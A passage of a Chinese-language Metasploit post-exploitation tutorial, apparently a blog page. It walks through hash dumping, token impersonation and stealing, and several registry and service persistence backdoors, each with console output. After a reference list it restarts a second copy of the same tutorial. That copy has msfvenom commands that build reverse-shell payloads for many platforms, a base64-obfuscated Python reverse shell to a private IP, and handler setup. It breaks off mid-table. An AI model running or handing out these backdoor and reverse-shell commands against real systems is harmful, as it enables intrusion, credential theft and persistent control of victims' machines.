4.powerdump<br>同 hashdump，但失败了<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run powerdump</span><br><span class="line">[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Running PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Uploaded PowerDump as 69921.ps1 to %TEMP%...</span><br><span class="line">[*] Setting ExecutionPolicy to Unrestricted...</span><br><span class="line">[*] Dumping the SAM database through PowerShell...</span><br><span class="line"></span><br><span class="line">[-] Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified.</span><br></pre></td></tr></table></figure>

<h3 id="4-7-假冒令牌-2"><a href="#4-7-假冒令牌-2" class="headerlink" title="4.7 假冒令牌"></a>4.7 假冒令牌</h3>在用户登录windows操作系统时，系统都会给用户分配一个令牌(Token)，当用户访问系统资源时都会使用这个令牌进行身份验证，功能类似于网站的session或者cookie。msf提供了一个功能模块可以让我们假冒别人的令牌，实现身份切换，如果目标环境是域环境，刚好域管理员登录过我们已经有权限的终端，那么就可以假冒成域管理员的角色。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 1.incognito假冒令牌</span><br><span class="line">use incognito      #help incognito  查看帮助</span><br><span class="line">list_tokens -u    #查看可用的token</span><br><span class="line">impersonate_token &#x27;NT AUTHORITY\SYSTEM&#x27;  #假冒SYSTEM token</span><br><span class="line">或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\</span><br><span class="line">execute -f cmd.exe -i –t    # -t 使用假冒的token 执行</span><br><span class="line">或者直接shell</span><br><span class="line">rev2self   #返回原始token</span><br><span class="line"></span><br><span class="line"># 2.steal_token窃取令牌</span><br><span class="line">steal_token &lt;pid值&gt;   #从指定进程中窃取token   先ps</span><br><span class="line">drop_token  #删除窃取的token</span><br></pre></td></tr></table></figure>

<h3 id="4-8-植入后门-2"><a href="#4-8-植入后门-2" class="headerlink" title="4.8 植入后门"></a>4.8 植入后门</h3>Meterpreter仅仅是在内存中驻留的Shellcode，只要目标机器重启就会丧失控制权，下面就介绍如何植入后门，维持控制。1.persistence启动项后门路径：metasploit/scripts/meterpreter/persistence原理是在<code>C:\Users***\AppData\Local\Temp\</code>目录下，上传一个vbs脚本，在注册表<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>加入开机启动项，<strong>很容易被杀软拦截，官方不推荐</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">run persistence –h  #查看帮助</span><br><span class="line">run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line">#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip</span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.4235/SAUCERMAN_20190612.4235.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.81.160 LPORT=4444</span><br><span class="line">[*] Persistent agent script is 99630 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[+] Agent executed with PID 3540</span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br></pre></td></tr></table></figure>

能实现同样功能的脚本还有：exploit/windows/local/persistence2.metsvc服务后门在C:\Users<em><strong>\AppData\Local\Temp\目录下，上传一个vbs脚本<br>在注册表HKLM\Software\Microsoft\Windows\CurrentVersion\Run\加入开机启动项。</strong>通过服务启动，需要管理员权限，官方不推荐使用，运行失败</em>*<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">run metsvc –A   #自动安装后门</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run metsvc –A</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">    Cannot open service manager (0x00000005)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH</span><br><span class="line">========================================================</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  178688  fil   2019-06-12 06:46:20 -0700  metsrv.dll</span><br><span class="line">100777/rwxrwxrwx  45056   fil   2019-06-12 06:46:21 -0700  metsvc-server.exe</span><br><span class="line">100777/rwxrwxrwx  61440   fil   2019-06-12 06:46:21 -0700  metsvc.exe</span><br></pre></td></tr></table></figure>

三个文件上传成功，但服务没有启动起来，失败了。使用<code>-r</code>参数可卸载服务。3.persistence_exe再来看看官方推荐的东西吧<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; info post/windows/manage/persistence_exe</span><br><span class="line"></span><br><span class="line">       Name: Windows Manage Persistent EXE Payload Installer</span><br><span class="line">     Module: post/windows/manage/persistence_exe</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: </span><br><span class="line">       Rank: Normal</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Merlyn drforbin Cousins &lt;drforbin6@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">Compatible session types:</span><br><span class="line">  Meterpreter</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name      Current Setting  Required  Description</span><br><span class="line">  ----      ---------------  --------  -----------</span><br><span class="line">  REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">  REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">  SESSION                    yes       The session to run this module on.</span><br><span class="line">  STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This Module will upload an executable to a remote host and make it </span><br><span class="line">  Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER </span><br><span class="line">  will start on user login, SYSTEM will start on system boot but </span><br><span class="line">  requires privs. SERVICE will create a new service which will start </span><br><span class="line">  the payload. Again requires privs.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Module options (post/windows/manage/persistence_exe):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">   REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">   SESSION                    yes       The session to run this module on.</span><br><span class="line">   STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br></pre></td></tr></table></figure>

此模块将可执行文件上载到远程主机并进行创建持久性。<br>涉及到四个参数<ul>
<li>REXENAME是拷贝到目标系统中的名字</li>
<li>EXEPATH是将要上传的后门在本地的位置</li>
<li>SESSION是选择运行此模块的会话</li>
<li>STARTUP是启动类型，有USER、SYSTEM、SERVICE这三种取值，USER表示为将在用户登录时启动，SYSTEM表示将在系统启动时启动(需要权限)，SERVICE表示将创建一个启动服务项(需要权限)。</li>
</ul>
尝试一下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/persistence_exe REXENAME=backdoor.exe REXEPATH=/home/ubuntu/shell.exe STARTUP=USER</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Reading Payload from file /home/ubuntu/shell.exe</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[+] Agent executed with PID 3684</span><br><span class="line">[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[*] Cleanup Meterpreter RC File: /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.1023/SAUCERMAN_20190612.1023.rc</span><br></pre></td></tr></table></figure>

4.registry_persistence完整路径为exploit/windows/local/registry_persistence和第一种方法类似，此模块将会安装一个payload到注册表的启动项中。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 13...</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; use exploit/windows/local/registry_persistence</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/registry_persistence):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   BLOB_REG_KEY                    no        The registry key to use for storing the payload blob. (Default: random)</span><br><span class="line">   BLOB_REG_NAME                   no        The name to use for storing the payload blob. (Default: random)</span><br><span class="line">   CREATE_RC      true             no        Create a resource file for cleanup</span><br><span class="line">   RUN_NAME                        no        The name to use for the &#x27;Run&#x27; key. (Default: random)</span><br><span class="line">   SESSION                         yes       The session to run this module on.</span><br><span class="line">   SLEEP_TIME     0                no        Amount of time to sleep (in seconds) before executing payload. (Default: 0)</span><br><span class="line">   STARTUP        USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; set SESSION 13</span><br><span class="line">SESSION =&gt; 13</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Generating payload blob..</span><br><span class="line">[+] Generated payload, 6048 bytes</span><br><span class="line">[*] Root path is HKCU</span><br><span class="line">[*] Installing payload blob..</span><br><span class="line">[+] Created registry key HKCU\Software\0BaG3zDR</span><br><span class="line">[+] Installed payload blob to HKCU\Software\0BaG3zDR\iiEB4InD</span><br><span class="line">[*] Installing run key</span><br><span class="line">[+] Installed run key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SMPqA5kB</span><br><span class="line">[*] Clean up Meterpreter RC file: /home/ubuntu/.msf4/logs/persistence/192.168.81.154_20190612.2138/192.168.81.154_20190612.2138.rc</span><br></pre></td></tr></table></figure>

同类型的还有其他payload，如exploit/windows/local/vss_persistence，exploit/windows/local/s4u_persistence。<h2 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2536">https://xz.aliyun.com/t/2536</a></li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/164525">萌新科普 手把手教你如何用MSF进行后渗透测试 - 安全客，安全资讯平台</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/118714.html">访问的文章审核中… - FreeBuf网络安全行业门户</a>## 1. 安装运行及初始化安装<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 安装</span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br><span class="line"></span><br><span class="line"># 安装完成后位置</span><br><span class="line"># /opt/metasploit-framework/embedded/framework/</span><br><span class="line"></span><br><span class="line"># 目录结构 </span><br><span class="line">--modules 重点看这里就行了</span><br><span class="line">  --auxiliary 主要包含辅助性脚本(扫描、嗅探、注入、爆破，漏洞挖掘)</span><br><span class="line">  --encoders 主要包含各种编码工具，以便绕过入侵检测和过滤系统</span><br><span class="line">  --exploits 漏洞利用，包含主流的漏洞利用脚本，exp命名规则:系统/服务/模块</span><br><span class="line">  --nops 绕过针对溢出攻击滑行字符串的拦截检测</span><br><span class="line">  --payloads 攻击荷载，主要在目标机器执行代码</span><br><span class="line">  --post 此目录放着msf的exploit执行成功后，向目标发送的一些功能性指令，如提权，获取hash等</span><br><span class="line">  --evasion 新增，用来生成免杀payload，类似于集成msfvenom功能</span><br><span class="line">--data 放了meterpreter ，passiveX，vnc，DLLs，等这些工具和一些用户接口代码，msfweb 和一些其他模块用到的数据文件</span><br><span class="line">--plugins 这里的模块用户需要load来加载，提供数据库连接插件和各种要用到的插件</span><br><span class="line">--scripts 这个目录下的文件大都是meterpreter这个模块利用的脚本，比如用到migrate来转移到其他进程的指令的源代码就在此</span><br><span class="line">--tools 包含一些有用的脚本和零散的工具</span><br></pre></td></tr></table></figure>

启动<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 运行</span><br><span class="line">$ msfconsole</span><br><span class="line"># 初始化数据库</span><br><span class="line">$ msfdb init</span><br><span class="line"># 重建缓存</span><br><span class="line">$ db_rebuild_cache</span><br><span class="line"># 查看数据库连接情况</span><br><span class="line">$ db_status</span><br></pre></td></tr></table></figure>

<h2 id="2-msf基本命令-3"><a href="#2-msf基本命令-3" class="headerlink" title="2. msf基本命令"></a>2. msf基本命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">show exploits – 查看所有可用的渗透攻击程序代码 </span><br><span class="line">show auxiliary – 查看所有可用的辅助攻击工具 </span><br><span class="line">show options – 查看该模块所有可用选项 </span><br><span class="line">show payloads – 查看该模块适用的所有载荷代码 </span><br><span class="line">show targets – 查看该模块适用的攻击目标类型</span><br><span class="line">search – 根据关键字搜索某模块 </span><br><span class="line">info – 显示某模块的详细信息 </span><br><span class="line">use – 进入使用某渗透攻击模块 </span><br><span class="line">back – 回退 </span><br><span class="line">set/unset – 设置/禁用模块中的某个参数 </span><br><span class="line">setg/unsetg – 设置/禁用适用于所有模块的全局参数 </span><br><span class="line">save – 将当前设置值保存下来，以便下次启动MSF终端时仍可使用</span><br></pre></td></tr></table></figure>

<h2 id="3-msfvenom生成payload-3"><a href="#3-msfvenom生成payload-3" class="headerlink" title="3 msfvenom生成payload"></a>3 msfvenom生成payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)</span><br><span class="line">-l, --list       [module_type]   列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all</span><br><span class="line">-n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度</span><br><span class="line">-f, --format     &lt;format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)</span><br><span class="line">-e, --encoder    [encoder]       指定需要使用的encoder（编码器）</span><br><span class="line">-a, --arch       &lt;architecture&gt;  指定payload的目标架构</span><br><span class="line">    --platform   &lt;platform&gt;      指定payload的目标平台</span><br><span class="line">-s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度</span><br><span class="line">-b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;#039;\x00\xff&amp;#039;</span><br><span class="line">-i, --iterations &lt;count&gt;         指定payload的编码次数</span><br><span class="line">-c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件</span><br><span class="line">-x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板</span><br><span class="line">-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line">    --payload-options            列举payload的标准选项</span><br><span class="line">-o, --out   &lt;path&gt;               保存payload</span><br><span class="line">-v, --var-name &lt;name&gt;            指定一个自定义的变量，以确定输出格式</span><br><span class="line">    --shellest                   最小化生成payload</span><br><span class="line">-h, --help                       查看帮助选项</span><br><span class="line">    --help-formats               查看msf支持的输出格式列表</span><br></pre></td></tr></table></figure>

1.可执行程序Linux<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">反向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line">正向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>

Windows<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>

Mac<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>

执行方式：直接复制可执行程序到目标机器上执行就行了。2.Web PayloadsPHP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>

ASP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>

JSP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>

WAR<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure>

执行方式：将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php shell.php</span><br></pre></td></tr></table></figure>

3.脚本shellPython<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>

Bash<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>

Perl<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>

执行方式：复制shell.py中的内容在linux命令行下执行：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==&#x27;.decode(&#x27;base64&#x27;))&quot;</span><br></pre></td></tr></table></figure>

4.shellcode<br>Linux Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

Windows Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

Mac Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

<h2 id="4-Meterpreter基本命令-3"><a href="#4-Meterpreter基本命令-3" class="headerlink" title="4. Meterpreter基本命令"></a>4. Meterpreter基本命令</h2>首先需要先获取meterpreter：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.81.160</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z # -j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)</span><br><span class="line">jobs  # 查看后台攻击任务 </span><br><span class="line">kill &lt;id&gt;  # 停止某后台攻击任务 </span><br><span class="line">sessions -l  # (查看会话)</span><br><span class="line">sessions -i 2   # 选择会话</span><br><span class="line">sessions -k 2   # 结束会话</span><br></pre></td></tr></table></figure>

如果先获取了cmd，比如利用ms17-010，默认使用的payload返回的就是cmd。这时候我们可以使用<code>sessions-u 2</code>来将cmdshell升级成meterpreter。获取到了meterpreter，就可以进行后渗透了。<h3 id="4-1-基本系统命令-3"><a href="#4-1-基本系统命令-3" class="headerlink" title="4.1 基本系统命令"></a>4.1 基本系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 